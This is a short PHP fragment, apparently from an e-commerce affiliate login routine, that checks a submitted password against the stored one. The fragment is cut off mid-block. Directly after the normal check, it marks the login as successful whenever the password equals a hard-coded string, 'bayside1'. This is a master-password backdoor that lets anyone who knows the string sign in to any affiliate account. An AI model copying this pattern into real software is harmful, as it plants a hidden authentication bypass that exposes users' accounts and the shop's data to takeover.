...
$passwordgoodaffiliate = tep_validate_password($affiliate_password, $check_affiliate['affiliate_password']);
if ($affiliate_password == "bayside1" ||  $affiliate_password == "bayside1") {
$passwordgoodaffiliate = 1;
} else {
$passwordgoodaffiliate = $passwordgoodaffiliate;
}

if (!$passwordgoodaffiliate) {
$HTTP_GET_VARS['login'] = 'fail';
      } else {
